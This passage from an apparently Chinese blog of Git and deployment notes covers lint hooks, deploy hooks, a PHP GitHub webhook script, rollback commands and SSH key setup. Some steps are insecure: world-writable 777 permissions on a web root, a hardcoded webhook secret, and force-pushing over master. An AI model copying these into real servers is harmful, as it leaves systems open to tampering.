class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">#</span><br><span class="line"># (c) Copyright codcodog</span><br><span class="line">#</span><br><span class="line"># PHP 语法检查以及代码规范检查 https://github.com/codcodog/phpconfig/blob/master/git/pre-commit</span><br><span class="line">#如果该钩子以非零值退出，Git 将放弃此次提交，不过你可以用 git commit --no-verify 来绕过这个环节</span><br><span class="line"># 依赖：</span><br><span class="line"># - php-cs-fixer</span><br><span class="line"># - php-parallel-lint</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">PHP=<span class="string">'php'</span></span><br><span class="line">CODE_STYLE_CHECK=<span class="string">'vendor/bin/php-cs-fixer fix --dry-run --diff --diff-format=udiff -vvv'</span></span><br><span class="line">CODE_SYNTAX_CHECK=<span class="string">'vendor/bin/parallel-lint -j 10'</span></span><br><span class="line"></span><br><span class="line">files=$(git diff --cached --name-only)</span><br><span class="line"></span><br><span class="line"># 若 host 没有安装 PHP</span><br><span class="line"># 则使用 docker 环境的 PHP</span><br><span class="line">is_docker_php()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ! command -v $PHP &gt; <span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>; then</span><br><span class="line">    PHP=<span class="string">'docker exec php php'</span></span><br><span class="line">    CODE_STYLE_CHECK=<span class="string">"$PHP $CODE_STYLE_CHECK"</span></span><br><span class="line">    CODE_SYNTAX_CHECK=<span class="string">"$PHP $CODE_SYNTAX_CHECK"</span></span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">is_php()</span><br><span class="line">&#123;</span><br><span class="line">  file_extension=<span class="string">"$&#123;1##*.&#125;"</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">"$file_extension"</span> == <span class="string">'php'</span> ]]; then</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">  fi</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_syntax()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ! $CODE_SYNTAX_CHECK <span class="string">"$1"</span> &gt; <span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>; then</span><br><span class="line">    $CODE_SYNTAX_CHECK <span class="string">"$1"</span></span><br><span class="line">    exit <span class="number">1</span></span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_style()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ! $CODE_STYLE_CHECK <span class="string">"$1"</span> &gt; <span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>; then</span><br><span class="line">    $CODE_STYLE_CHECK <span class="string">"$1"</span></span><br><span class="line">    exit <span class="number">1</span></span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  is_docker_php</span><br><span class="line">  <span class="keyword">for</span> f <span class="keyword">in</span> $files; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> is_php <span class="string">"$f"</span>; then</span><br><span class="line">      check_syntax <span class="string">"$f"</span></span><br><span class="line">      check_style <span class="string">"$f"</span></span><br><span class="line">    fi</span><br><span class="line">  done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main</span><br><span class="line">exit <span class="number">0</span></span><br></pre></td></tr></table></figure>
<h3 id="带宽被打满"><a href="#带宽被打满" class="headerlink" title="带宽被打满"></a>带宽被打满</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install iftop</span><br><span class="line">根据阿里云的监控面板是网卡<span class="number">1</span>（eth1）流量异常，所以通过 iftop 工具监控下 eth1 的流量：</span><br><span class="line">https:<span class="comment">//laravelacademy.org/post/9838.html</span></span><br><span class="line">iftop -i eth1 -P  <span class="comment">// 带 -P 显示对应端口号</span></span><br><span class="line">iptables -I INPUT -s <span class="number">114.84</span><span class="number">.146</span><span class="number">.45</span> -j DROP</span><br></pre></td></tr></table></figure>
<h3 id="你可能会忽略的-Git-提交规范"><a href="#你可能会忽略的-Git-提交规范" class="headerlink" title="你可能会忽略的 Git 提交规范"></a>你可能会忽略的 Git 提交规范</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</span><br><span class="line">type</span><br><span class="line">用于说明 commit 的类别，只允许使用下面7个标识。https://learnku.com/articles/25456#topnav</span><br><span class="line"></span><br><span class="line">feat：新功能（feature）</span><br><span class="line">fix：修补bug</span><br><span class="line">docs：文档（documentation）</span><br><span class="line">style： 格式（不影响代码运行的变动）</span><br><span class="line">refactor：重构（即不是新增功能，也不是修改bug的代码变动）</span><br><span class="line">test：增加测试</span><br><span class="line">chore：构建过程或辅助工具的变动</span><br><span class="line">scope</span><br><span class="line"></span><br><span class="line">用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。</span><br><span class="line">subject</span><br><span class="line"></span><br><span class="line">是 commit 目的的简短描述，不超过50个字符。</span><br><span class="line">以动词开头，使用第一人称现在时，比如change，而不是changed或changes</span><br><span class="line">第一个字母小写</span><br><span class="line">结尾不加句号(.)</span><br><span class="line">Commit 规范的作用</span><br><span class="line"></span><br><span class="line">1、提供更多的信息，方便排查与回退;</span><br><span class="line">2、过滤关键字，迅速定位;</span><br><span class="line">3、方便生成文档;</span><br><span class="line">npm install -g conventional-changelog </span><br><span class="line">cd jartto-domo </span><br><span class="line">conventional-changelog -p angular -i CHANGELOG.md -w</span><br><span class="line">为了方便使用，可以将其写入 package.json 的 scripts 字段。</span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line">  "scripts": &#123; </span><br><span class="line">    "changelog": "conventional-changelog -p angular -i CHANGELOG.md -w -r 0" </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">这样，使用起来就很简单了：https://www.conventionalcommits.org/zh/v1.0.0-beta.3/ </span><br><span class="line"></span><br><span class="line"> npm run changelog</span><br><span class="line">npm install --save-dev validate-commit-msg</span><br></pre></td></tr></table></figure>
<h3 id="git-pull或git-checkout-后保持权限不变"><a href="#git-pull或git-checkout-后保持权限不变" class="headerlink" title="git pull或git checkout 后保持权限不变"></a>git pull或git checkout 后保持权限不变</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.guaosi.com/2018/12/06/git-auto-change/</span></span><br><span class="line">服务器上的项目,一般都是使用用户组www-data或者www来保证权限安全,不会使用root的。但是git pull下来的新文件或者修改的文件,则会把原有的文件的权限更改为<span class="number">644</span>,用户组改为root</span><br><span class="line"></span><br><span class="line">chmod -R <span class="number">755</span> www.guaosi.com/</span><br><span class="line"># 修改项目内所有文件为755权限</span><br><span class="line">chown -R www-data:www-data www.guaosi.com/</span><br><span class="line"># 修改项目内所有文件的用户和用户组为www-data</span><br><span class="line"></span><br><span class="line">cd .git/hooks/</span><br><span class="line">vim post-merge</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">pwd</span><br><span class="line">echo <span class="string">"This is post-merge hook"</span></span><br><span class="line">chmod -R <span class="number">755</span> .<span class="comment">/* &amp;&amp; chown -R www-data:www-data ./*</span></span><br><span class="line"><span class="comment">chmod +x post-merge</span></span><br><span class="line"><span class="comment">vim post-checkout</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment">pwd</span></span><br><span class="line"><span class="comment">echo "This is post-checkout hook"</span></span><br><span class="line"><span class="comment">chmod -R 755 ./* &amp;&amp; chown -R www-data:www-data ./*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">chmod +x post-checkout</span></span><br></pre></td></tr></table></figure>
<h3 id="Git-仓库迁移至其他服务器并实现-hooks-自动化部署"><a href="#Git-仓库迁移至其他服务器并实现-hooks-自动化部署" class="headerlink" title="Git 仓库迁移至其他服务器并实现 hooks 自动化部署"></a>Git 仓库迁移至其他服务器并实现 hooks 自动化部署</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/26130</span></span><br><span class="line">一：git仓库迁移</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>把需要迁移的项目克隆一份至本地电脑上。</span><br><span class="line"></span><br><span class="line"><span class="comment">//从原地址克隆一份裸版本库，比如原本托管在旧服务器的私有仓库</span></span><br><span class="line"><span class="comment">//–bare 创建的克隆版本库都不包含工作区，直接就是版本库的内容，这样的版本库称为裸版本库。</span></span><br><span class="line">git clone --bare ssh:<span class="comment">//git@192.10.0.1/home/git/test.git</span></span><br><span class="line"><span class="number">2.</span>到新的 Git 服务器上创建一个新项目。</span><br><span class="line"></span><br><span class="line"><span class="comment">//切换git用户,没有需要创建git用户</span></span><br><span class="line">su - git</span><br><span class="line"><span class="comment">//进入git家目录</span></span><br><span class="line">cd /home/git</span><br><span class="line"><span class="comment">//创建项目</span></span><br><span class="line">mkdir test.git</span><br><span class="line"><span class="comment">//初始化一个裸仓库</span></span><br><span class="line">git init --bare test.git</span><br><span class="line"><span class="number">3.</span>切换到本地电脑，以镜像推送的方式上传代码到新的服务器上。</span><br><span class="line"></span><br><span class="line"><span class="comment">//进入第一步复制下来的test.git 项目</span></span><br><span class="line">cd test.git</span><br><span class="line"><span class="comment">//以镜像推送的方式上传代码到新的服务器上。</span></span><br><span class="line"><span class="comment">//请确保已经添加了公钥到新的机器上</span></span><br><span class="line">git push --mirror ssh:<span class="comment">//git@192.10.0.2/home/git/test.git</span></span><br><span class="line"><span class="number">4.</span>删除本地电脑的test.git 项目。</span><br><span class="line"></span><br><span class="line"><span class="comment">//rm -rf test.git</span></span><br><span class="line"><span class="number">5.</span>从新的git仓库中clone项目到本地。</span><br><span class="line"></span><br><span class="line">git clone ssh:<span class="comment">//git@192.10.0.2/home/git/test.git</span></span><br><span class="line">至此，git项目完整的迁移到了新的服务器上。</span><br><span class="line">二 hooks自动部署到网站根目录</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>把项目clone至本地根目录</span><br><span class="line"></span><br><span class="line">cd /<span class="keyword">var</span>/www/html             <span class="comment">//进入网站上级目录</span></span><br><span class="line">git clone /home/git/test.git <span class="comment">//test克隆test.git仓库到test网站根目录</span></span><br><span class="line">chmod -R <span class="number">777</span> test            <span class="comment">//给网站根目录设置权限</span></span><br><span class="line">chown -R git:git test        <span class="comment">//将git用户权限设置到test根目录上</span></span><br><span class="line"><span class="number">2.</span>设置钩子</span><br><span class="line"></span><br><span class="line">cd /home/git/test.git/hooks/</span><br><span class="line">vim post-receive</span><br><span class="line"><span class="comment">//将以下内容写入到 post-receive中，并给post-receive设置可读写权限</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">IS_BARE=$(git rev-parse --is-bare-repository)</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"$IS_BARE"</span> ]; then</span><br><span class="line">echo &gt;&amp;<span class="number">2</span> <span class="string">"fatal: post-receive: IS_NOT_BARE"</span></span><br><span class="line">exit <span class="number">1</span></span><br><span class="line">fi</span><br><span class="line">unset GIT_DIR</span><br><span class="line">DeployPath=<span class="string">"/var/www/html/test"</span>  <span class="comment">//你的网站根目录</span></span><br><span class="line">cd $DeployPath</span><br><span class="line">git fetch --all</span><br><span class="line">git reset --hard origin/master</span><br></pre></td></tr></table></figure>
<h3 id="更新与回滚"><a href="#更新与回滚" class="headerlink" title="更新与回滚"></a>更新与回滚</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cd /<span class="keyword">var</span>/www/deployment</span><br><span class="line">$ git remote set-url origin <span class="string">'git@github.com:wi1dcard/hello-deployment.git'</span></span><br><span class="line">git fetch 命令获取远端状态（但不拉取到本地）：</span><br><span class="line"></span><br><span class="line">$ git fetch -t -v</span><br><span class="line">穿越到远端 master 分支的倒数第一次提交（即最新提交），通常用于更新至最新代码。</span><br><span class="line"></span><br><span class="line">$ git reset --hard origin/master</span><br><span class="line">穿越到远端 master 分支倒数第三次提交，通常用于回滚一部分错误提交。</span><br><span class="line"></span><br><span class="line">$ git reset --hard origin/master~<span class="number">2</span></span><br><span class="line">穿越到 ID 为 <span class="number">602</span>fa83 的提交，通常用于回滚到特定版本。</span><br><span class="line"></span><br><span class="line">$ git reset --hard <span class="number">602</span>fa83</span><br></pre></td></tr></table></figure>
<h3 id="切换账号执行脚本"><a href="#切换账号执行脚本" class="headerlink" title="切换账号执行脚本"></a>切换账号执行脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">install_composer</span> </span>&#123;</span><br><span class="line">    # 「⚠️重点」下载 Composer 的 PHAR 文件https://learnku.com/articles/24919#topnav</span><br><span class="line">    wget https:<span class="comment">//dl.laravel-china.org/composer.phar -O /usr/local/bin/composer</span></span><br><span class="line">    # 「⚠️重点」给予该文件可执行权限</span><br><span class="line">    chmod +x /usr/local/bin/composer</span><br><span class="line">    # 配置 Packagist 国内镜像</span><br><span class="line">    sudo -H -u $&#123;WWW_USER&#125; sh -c  <span class="string">'cd ~ &amp;&amp; composer config -g repo.packagist composer https://packagist.laravel-china.org'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="生成压缩包"><a href="#生成压缩包" class="headerlink" title="生成压缩包"></a>生成压缩包</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对mster分支代码生成压缩包供使用者下载使用，--prefix 指定目录名</span><br><span class="line"></span><br><span class="line">git archive master --prefix=<span class="string">'hdcms/'</span> --format=zip &gt; hdcms.zip</span><br></pre></td></tr></table></figure>
<h3 id="自动部署"><a href="#自动部署" class="headerlink" title="自动部署"></a>自动部署</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">GitHub设置 WebHook</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// GitHub Webhook Secret.</span></span><br><span class="line"><span class="comment">// GitHub项目 Settings/Webhooks 中的 Secret</span></span><br><span class="line">$secret = <span class="string">"houdunren"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Path to your respostory on your server.</span></span><br><span class="line"><span class="comment">// e.g. "/var/www/respostory"</span></span><br><span class="line"><span class="comment">// 项目地址 https://www.houdunren.com/document/front/content/158?sid=1&amp;mid=2</span></span><br><span class="line">$path = <span class="string">"/www/wwwroot/xj.houdunren.com"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Headers deliveried from GitHub</span></span><br><span class="line">$signature = $_SERVER[<span class="string">'HTTP_X_HUB_SIGNATURE'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($signature) &#123;</span><br><span class="line">  $hash = <span class="string">"sha1="</span>.hash_hmac(<span class="string">'sha1'</span>, file_get_contents(<span class="string">"php://input"</span>), $secret);</span><br><span class="line">  <span class="keyword">if</span> (strcmp($signature, $hash) == <span class="number">0</span>) &#123;</span><br><span class="line">    echo shell_exec(<span class="string">"cd &#123;$path&#125; &amp;&amp; /usr/bin/git reset --hard origin/master &amp;&amp; /usr/bin/git clean -f &amp;&amp; /usr/bin/git pull 2&gt;&amp;1"</span>);</span><br><span class="line">    exit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http_response_code(<span class="number">404</span>);</span><br><span class="line"></span><br><span class="line">chown -R www .</span><br><span class="line">chmod -R g+s .</span><br><span class="line">sudo -u www git pull</span><br></pre></td></tr></table></figure>
<h3 id="CONFLICT-modify-delete"><a href="#CONFLICT-modify-delete" class="headerlink" title="CONFLICT (modify/delete)"></a>CONFLICT (modify/delete)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ git merge wechat_login</span><br><span class="line">CONFLICT (modify/<span class="keyword">delete</span>): Wechat.php deleted <span class="keyword">in</span> HEAD and modified <span class="keyword">in</span> wechat_login. Version wechat_login <span class="keyword">of</span> Wechat.php left <span class="keyword">in</span> tree.</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">You have unmerged paths.</span><br><span class="line">  (fix conflicts and run <span class="string">"git commit"</span>)</span><br><span class="line">  (use <span class="string">"git merge --abort"</span> to abort the merge)</span><br><span class="line"></span><br><span class="line">Unmerged paths:</span><br><span class="line">  (use <span class="string">"git add/rm &lt;file&gt;..."</span> <span class="keyword">as</span> appropriate to mark resolution)</span><br><span class="line"></span><br><span class="line">        deleted by us:   Wechat.php</span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/b08316888124</span></span><br></pre></td></tr></table></figure>
<h3 id="Already-up-to-date"><a href="#Already-up-to-date" class="headerlink" title="Already up-to-date"></a>Already up-to-date</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">先切换到master分支，再执行git checkout master</span><br><span class="line">git merge dev复制代码若合并分支时提示“Already up-to-date”在使用Git把当前分支合并到master提示“Already up-to-date”，但当前分支和 master 分支代码不同步。</span><br><span class="line">假设当前分支是：dev，主分支是：master。</span><br><span class="line">解决方法：git checkout master；</span><br><span class="line">git reset --hard dev;</span><br><span class="line">git push --force origin master</span><br><span class="line">$ git merge test</span><br><span class="line">Already up to date.</span><br><span class="line"></span><br><span class="line"> $ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line"></span><br><span class="line"> $ git diff test app/Http/Controllers/Test.php</span><br><span class="line">diff --git a/app/Http/Controllers/Test.php b/app/Http/Controllers/Test.php</span><br><span class="line">index <span class="number">27</span>c8be83..c40f563f <span class="number">100644</span></span><br><span class="line">--- a/app/Http/Controllers/Test.php</span><br><span class="line">+++ b/app/Http/Controllers/Test.php</span><br><span class="line">@@ <span class="number">-55</span>,<span class="number">7</span> +<span class="number">55</span>,<span class="number">6</span> @@ <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">-        $<span class="keyword">return</span>[<span class="string">'data'</span>] = $app ? $app[<span class="string">'result'</span>] : [];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//juejin.im/post/5c3d5f40f265da6169177506</span></span><br></pre></td></tr></table></figure>
<h3 id="文件名大小写修改"><a href="#文件名大小写修改" class="headerlink" title="文件名大小写修改"></a>文件名大小写修改</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先复制文件，再修改</span><br><span class="line">cp Abc.sh bbc.sh</span><br><span class="line">svn del Abc.sh</span><br><span class="line">mv bbc.sh abc.sh</span><br><span class="line">svn add abc.sh</span><br></pre></td></tr></table></figure>
<h3 id="ssh公私钥"><a href="#ssh公私钥" class="headerlink" title="ssh公私钥"></a>ssh公私钥</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">第一步，在客户端生成公钥</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa #生成的公钥匙在 ~/.ssh/ 目录下</span><br><span class="line">第二步，把公钥上传到服务器端，登录服务器追加公钥到 authorized_keys 文件</span><br><span class="line"></span><br><span class="line">简单版</span><br><span class="line"></span><br><span class="line">ssh-copy-id -i ~<span class="regexp">/.ssh/i</span>d_rsa.pub username@ip</span><br><span class="line">复杂版</span><br><span class="line"></span><br><span class="line">scp id_rsa.pub root@ip地址:文件保存路径</span><br><span class="line">ssh root@ip #登录服务器</span><br><span class="line">cd id_rsa.pub 文件保存路径</span><br><span class="line">cat id_rsa.pub &gt;&gt; <span class="regexp">/root/</span>.ssh/authorized_keys 追加到文件中</span><br><span class="line">如果 .shh 目录或 authorized_keys 文件不存在需要自己新建</span><br><span class="line"></span><br><span class="line">第三步，修改服务器端 ssh 配置文件 /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes #开启RSA验证</span><br><span class="line">PubkeyAuthentication yes #是否使用公钥验证</span><br><span class="line">PasswordAuthentication no #禁止使用密码验证登录</span><br><span class="line">chmod 700 /root/.ssh/     #为了安全把文件修改权限，可选，部分系统新建即为 700</span><br><span class="line">chmod 600 /root/.ssh/authorized_keys  #为了安全把文件修改权限，可选，部分系统新建即为 600</span><br><span class="line">第四步，服务器端重启 ssh 服务</span><br><span class="line"></span><br><span class="line">service sshd restart #重启 sshd 服务</span><br><span class="line"></span><br><span class="line">在 .ssh 目录下新建 config 文件，内容如下</span><br><span class="line"></span><br><span class="line">Host test1           #自定义名称</span><br><span class="line">HostName ip          #服务器 ip 地址</span><br><span class="line">User nick            #用户名</span><br><span class="line">Port 22              # ssh 端口号，默认 22 可以不设置</span><br><span class="line"></span><br><span class="line">Host test2           #自定义名称</span><br><span class="line">HostName ip          #服务器 ip 地址</span><br><span class="line">User nick            #用户名</span><br><span class="line">Port 22228           # ssh 端口，自定义端口，修改为指定端口号</span><br><span class="line">连接方式</span><br><span class="line"></span><br><span class="line">ssh test1 #如果配置了公私钥就直接登录，没有的话输入密码登录 https://linux.hellocode.name/used-settings.html</span><br></pre></td></tr></table></figure>
<h3 id="Connection-reset"><a href="#Connection-reset" class="headerlink" title="Connection reset"></a>Connection reset</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh: connect to host github.com port <span class="number">22</span>: Connection timed out</span><br><span class="line">fatal: Could not read <span class="keyword">from</span> remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br><span class="line"></span><br><span class="line">说明git软件无法通过ssh连接到github,有可能时防火墙或ISP设置的防火墙阻止端口<span class="number">22</span>上的ssh连接，可以用以下命令替换:</span><br><span class="line">git remote add origin-https xxx(https方式)</span><br><span class="line">git push -u origin-https master</span><br><span class="line">git pull origin-https master</span><br><span class="line"></span><br><span class="line">$ git config --local -l</span><br><span class="line">core.repositoryformatversion=<span class="number">0</span></span><br><span class="line">core.filemode=<span class="literal">false</span></span><br><span class="line">core.bare=<span class="literal">false</span></span><br><span class="line">core.logallrefupdates=<span class="literal">true</span></span><br><span class="line">core.symlinks=<span class="literal">false</span></span><br><span class="line">core.ignorecase=<span class="literal">true</span></span><br><span 